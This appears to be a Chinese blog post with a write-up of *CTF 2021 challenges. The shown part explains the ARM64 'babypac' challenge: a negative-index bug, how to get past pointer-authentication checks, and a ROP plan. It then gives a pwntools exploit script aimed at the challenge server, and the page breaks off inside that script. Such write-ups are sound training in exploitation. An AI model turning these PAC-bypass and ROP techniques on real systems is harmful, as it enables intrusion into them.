<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"pullp.github.io","root":"/","images":"/images","scheme":"Mist","version":"8.7.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
<meta name="description" content="*ctf 2021 writeup">
<meta property="og:type" content="article">
<meta property="og:title" content="starctf(*ctf)-2021 writeup">
<meta property="og:url" content="https://pullp.github.io/2021/01/23/starctf-2021-writeup/index.html">
<meta property="og:site_name" content="wxk1997&#39;s blog">
<meta property="og:description" content="*ctf 2021 writeup">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2021-01-22T16:00:00.000Z">
<meta property="article:modified_time" content="2021-08-27T08:21:06.371Z">
<meta property="article:author" content="wxk1997">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="re">
<meta property="article:tag" content="riscv">
<meta property="article:tag" content="arm">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://pullp.github.io/2021/01/23/starctf-2021-writeup/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://pullp.github.io/2021/01/23/starctf-2021-writeup/","path":"2021/01/23/starctf-2021-writeup/","title":"starctf(*ctf)-2021 writeup"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>starctf(*ctf)-2021 writeup | wxk1997's blog</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">wxk1997's blog</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">learn and share</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
        <li class="menu-item menu-item-friends"><a href="/friends/" rel="section"><i class="fa fa-archive fa-fw"></i>friends</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%AD%A3%E6%96%87"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn-babypac"><span class="nav-number">2.1.</span> <span class="nav-text">pwn-babypac</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#re-stream"><span class="nav-number">2.2.</span> <span class="nav-text">re-stream</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#re-amp-pwn-favourite-architecture"><span class="nav-number">2.3.</span> <span class="nav-text">re&amp;pwn-favourite architecture</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#first-flag-reverse"><span class="nav-number">2.3.1.</span> <span class="nav-text">first flag-reverse</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#second-flag-orw"><span class="nav-number">2.3.2.</span> <span class="nav-text">second flag-orw</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#third-flag-getshell"><span class="nav-number">2.3.3.</span> <span class="nav-text">third flag-getshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn-babyxv6"><span class="nav-number">2.4.</span> <span class="nav-text">pwn-babyxv6</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-syscall-%E5%92%8C%E8%BF%94%E5%9B%9E%E6%B5%81%E7%A8%8B"><span class="nav-number">2.4.1.</span> <span class="nav-text">系统调用(syscall)和返回流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95"><span class="nav-number">2.4.2.</span> <span class="nav-text">调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rop-getshell"><span class="nav-number">2.4.3.</span> <span class="nav-text">rop getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98"><span class="nav-number">2.4.4.</span> <span class="nav-text">遇到的一些问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">2.4.5.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-number">3.</span> <span class="nav-text">结语</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-overview">
            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="wxk1997"
      src="https://avatars0.githubusercontent.com/u/20255635">
  <p class="site-author-name" itemprop="name">wxk1997</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">23</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">19</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/pullp" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;pullp" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:weixiankui1997@gmail.com" title="E-Mail → mailto:weixiankui1997@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



          </div>
        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://pullp.github.io/2021/01/23/starctf-2021-writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/20255635">
      <meta itemprop="name" content="wxk1997">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wxk1997's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          starctf(*ctf)-2021 writeup
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-23 00:00:00" itemprop="dateCreated datePublished" datetime="2021-01-23T00:00:00+08:00">2021-01-23</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2021-08-27 16:21:06" itemprop="dateModified" datetime="2021-08-27T16:21:06+08:00">2021-08-27</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><table>
<thead>
<tr>
<th>更新时间</th>
<th>更新内容</th>
</tr>
</thead>
<tbody><tr>
<td>2021-01-23</td>
<td>babypac, stream</td>
</tr>
<tr>
<td>2021-01-29</td>
<td>favorite architecture part1</td>
</tr>
<tr>
<td>2021-01-29</td>
<td>favorite architecture part2</td>
</tr>
<tr>
<td>2021-02-03</td>
<td>baby xv6</td>
</tr>
</tbody></table>
<p>记录一下*ctf中做的和复现的几个题目.</p>
<p>官方 wp : <a target="_blank" rel="noopener" href="https://github.com/sixstars/starctf2021">https://github.com/sixstars/starctf2021</a> </p>
<hr>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="pwn-babypac"><a href="#pwn-babypac" class="headerlink" title="pwn-babypac"></a>pwn-babypac</h2><p>一道 arm pwn:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     aarch64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>程序开始先读取32字节的<code>name</code>, 存在 bss 段中, 然后提供四个功能供我们选择:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D; BabyPAC &#x3D;&#x3D;&#x3D;</span><br><span class="line">1. add</span><br><span class="line">2. lock</span><br><span class="line">3. show</span><br><span class="line">4. auth</span><br><span class="line">5. exit</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>add 功能就是读取一个 32 位 int 型数字 <code>num</code> , 然后存到 bss 段的数组 <code>arr</code> 中</p>
<p>lock 功能会对 <code>arr</code> 中第 <code>i</code> 个 <code>num</code> 进行加密操作(也可能是 hash , 不确定是否可逆, 暂且称之为加密操作, 下文中我们用 <code>encode()</code> 指代进行加密操作的函数), 并替换原来的 <code>num</code> .</p>
<p>show 功能会打印 <code>arr</code> 中所有非 0 元素.</p>
<p>auth 功能会判断 <code>arr</code> 中第 <code>i</code> 个 <code>num</code> 和 <code>encode(0x10A9FC70042LL)</code> 的结果进行比较, 若相等则会调用一个危险函数(下文中我们用 <code>vuln()</code> 指代该函数), 该函数中包含一个栈溢出漏洞.</p>
<p>乍一看貌似很简单, 我们可以通过调试获取 <code>encode(0x10A9FC70042LL)</code> 的结果,然后将结果 add 到 <code>arr</code> 中, 再调用 auth 功能即可.</p>
<p>但是通过调试发现这个结果竟然每次都不一样, 经过分析发现问题出在了下面这条汇编指令上:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"># 此时X8中的值为 0000010A9FC70042h</span><br><span class="line">.text:0000000000400D68                 PACIA           X8, SP</span><br><span class="line"># 此时X8中的值为 00XX010A9FC70042h, 其中XX为一个随机字节.</span><br><span class="line">...</span><br><span class="line">.text:0000000000400D8C                 BL              encode</span><br></pre></td></tr></table></figure>

<p>关于 <code>pacia</code> 指令的详细信息参考 <a target="_blank" rel="noopener" href="https://developer.arm.com/documentation/dui0801/g/A64-General-Instructions/PACIA--PACIZA--PACIA1716--PACIASP--PACIAZ">ARM Compiler armasm User Guide Version 6.6</a> , 通俗点说, 这个指令进行了一个hash 操作, hash的输入有三个:</p>
<ul>
<li>地址, 此处为 X8 中的值</li>
<li>上下文, 此处为 SP 中的值</li>
<li>key , 在一个用户不可见的寄存器中, 每个进程都不一样</li>
</ul>
<p>输出则为一个 64 bit 的密文, 然后对密文截断取一个字节(下文中我们用 auth_code 指代这一个随机字节), 放到 X8 中的第 7 字节中.</p>
<p>多说两句, 这个指令是属于 ARMv8.3 中引入的指针认证( Pointer Authentication )机制中的一个指令中, 更多相关指令和用法可以参考 <a target="_blank" rel="noopener" href="https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf">ARMv8.3 Pointer Authentication</a> . 这个机制的主要目的就是防止指针被篡改, 可以用来预防 rop 之类的攻击, 之后我们利用栈溢出漏洞进行 rop 的时候仍然需要绕过它.</p>
<p>既然随机只有一个字节, 那么我们完全可以进行爆破操作 1/256 的成功率还是可以接受的. 不过后来发现 lock 功能和 auth 功能中都没有考虑 index 为负数的情况, 而且恰好 <code>name</code> 是在 <code>arr</code> 的相邻低地址出, 因此我们可以在 <code>name</code> 中输入 <code>0x10A9FC70042</code> 然后对其进行 lock , 正好 lock 时的 sp 和 auth 中的 sp 是相同的, 因此计算得到的 auth_code 也是一样的, 自然就可以轻松通过校验, 走到 <code>vuln()</code> 函数中.  <code>vuln</code> 函数中有两个指令比较关键, 分别位于函数的开头和结尾</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400BDC                 PACIASP</span><br><span class="line">...</span><br><span class="line">.text:0000000000400C08                 RETAA</span><br></pre></td></tr></table></figure>

<p>PACIASP (<a target="_blank" rel="noopener" href="https://developer.arm.com/documentation/dui0801/g/A64-General-Instructions/PACIA--PACIZA--PACIA1716--PACIASP--PACIAZ">PACIA, PACIZA, PACIA1716, PACIASP, PACIAZ – arm文档</a>)指令会使用 X30, SP, key 作为输出, 计算并截断得到一个字节的 auth_code , 填到 X30 的第 7 字节中( X30 也即 LR 寄存器, 其中存储着返回地址)</p>
<p>RETAA( <a target="_blank" rel="noopener" href="https://developer.arm.com/documentation/dui0801/k/A64-General-Instructions/RETAA--RETAB?lang=en">RETAA, RETAB – arm 文档</a> )指令会校验 X30 中的 auth_code , 如果校验失败, 程序将会直接退出. </p>
<p>这儿我一开始的思路是直接爆破, 毕竟只有一个字节. 但是经过 mqa 提醒发现可以利用 show 功能打印 lock 之后的地址, 从而通过校验. 经过实验发现 lock 中的<code>pacia</code> 指令和 <code>vuln()</code> 开头的 <code>paciasp</code> 指令执行时的上下文( sp )都一样, 因此结果自然也就一样, 我们就可以直接得到正确的 auth_code. 之后就是常规的 rop , rop 思路来自 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39869547/article/details/105255683">ARM64下ROP，以及调试技巧总结 – csdn</a> (感谢X1do0的搜索), 感觉思路和X86下的 ret2csu 差不多. 最后 exp 如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> io</span><br><span class="line">ru = <span class="keyword">lambda</span> p, x        : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x        : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p           : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x        : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>   : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b     : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b    : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t        : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x        : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">charset = []</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">58</span>):</span><br><span class="line">    charset.append(<span class="built_in">bytes</span>([w]))</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>):</span><br><span class="line">    charset.append(<span class="built_in">bytes</span>([w]))</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>):</span><br><span class="line">    charset.append(<span class="built_in">bytes</span>([w]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bp</span>(<span class="params">tail, sha, io</span>):</span></span><br><span class="line">    <span class="keyword">for</span> char1 <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> char2 <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> char3 <span class="keyword">in</span> charset:</span><br><span class="line">                <span class="keyword">for</span> char4 <span class="keyword">in</span> charset:</span><br><span class="line">                    _sha = hashlib.sha256(char1+char2+char3+char4+tail).hexdigest().encode()</span><br><span class="line">                    <span class="keyword">if</span> _sha == sha:</span><br><span class="line">                        print(char1+char2+char3+char4+tail)</span><br><span class="line">                        sla(io, <span class="string">&#x27;Give me xxxx:\n&#x27;</span>, char1+char2+char3+char4)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># amd64 or x86</span></span><br><span class="line">context(arch = <span class="string">&#x27;aarch64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, endian = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./chall&quot;</span></span><br><span class="line">ip = <span class="string">&quot;52.255.184.147&quot;</span></span><br><span class="line">port = <span class="number">8080</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="built_in">len</span>(sys.argv)==<span class="number">1</span></span><br><span class="line"></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = ELF(<span class="string">&quot;./lib/libc.so.6&quot;</span>)</span><br><span class="line">libc.address = <span class="number">0x4000844000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pause</span>(<span class="params">p, s = <span class="string">&#x27;pause&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> LOCAL:</span><br><span class="line">        print(<span class="string">&#x27;pid: &#x27;</span> + <span class="built_in">str</span>(p.pid))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">input</span>(s)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">input</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    sla(p, <span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span>(<span class="params">name, val</span>):</span></span><br><span class="line">    log.info(name+<span class="string">&quot; : &quot;</span>+<span class="built_in">hex</span>(val))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p, val</span>):</span></span><br><span class="line">    choice(p, <span class="number">1</span>)</span><br><span class="line">    sla(p, <span class="string">&quot;identity: &quot;</span>, <span class="built_in">str</span>(val))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lock</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    choice(p, <span class="number">2</span>)</span><br><span class="line">    sla(p, <span class="string">&quot;idx: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    choice(p, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    choice(p, <span class="number">4</span>)</span><br><span class="line">    sla(p, <span class="string">&quot;idx: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause(io)</span></span><br><span class="line"></span><br><span class="line">mapping = &#123;    <span class="number">0x10217c8ccc5af919</span> : <span class="number">0x400ff8</span>,<span class="number">0x10a068a44d5af919</span> : <span class="number">0x1000000400ff8</span>,<span class="number">0x112354ddce5af919</span> : <span class="number">0x2000000400ff8</span>,<span class="number">0x11a240f54f5af919</span> : <span class="number">0x3000000400ff8</span>,<span class="number">0x12252c2ec85af919</span> : <span class="number">0x4000000400ff8</span>,<span class="number">0x12a43806495af919</span> : <span class="number">0x5000000400ff8</span>,<span class="number">0x1327047fca5af919</span> : <span class="number">0x6000000400ff8</span>,<span class="number">0x13a610574b5af919</span> : <span class="number">0x7000000400ff8</span>,<span class="number">0x1429ddc8c45af919</span> : <span class="number">0x8000000400ff8</span>,<span class="number">0x14a8c9e0455af919</span> : <span class="number">0x9000000400ff8</span>,<span class="number">0x152bf599c65af919</span> : <span class="number">0xa000000400ff8</span>,<span class="number">0x15aae1b1475af919</span> : <span class="number">0xb000000400ff8</span>,<span class="number">0x162d8d6ac05af919</span> : <span class="number">0xc000000400ff8</span>,<span class="number">0x16ac9942415af919</span> : <span class="number">0xd000000400ff8</span>,<span class="number">0x172fa53bc25af919</span> : <span class="number">0xe000000400ff8</span>,<span class="number">0x17aeb113435af919</span> : <span class="number">0xf000000400ff8</span>,<span class="number">0x18303e04dc5af919</span> : <span class="number">0x10000000400ff8</span>,<span class="number">0x18b12a2c5d5af919</span> : <span class="number">0x11000000400ff8</span>,<span class="number">0x19321655de5af919</span> : <span class="number">0x12000000400ff8</span>,<span class="number">0x19b3027d5f5af919</span> : <span class="number">0x13000000400ff8</span>,<span class="number">0x1a346ea6d85af919</span> : <span class="number">0x14000000400ff8</span>,<span class="number">0x1ab57a8e595af919</span> : <span class="number">0x15000000400ff8</span>,<span class="number">0x1b3646f7da5af919</span> : <span class="number">0x16000000400ff8</span>,<span 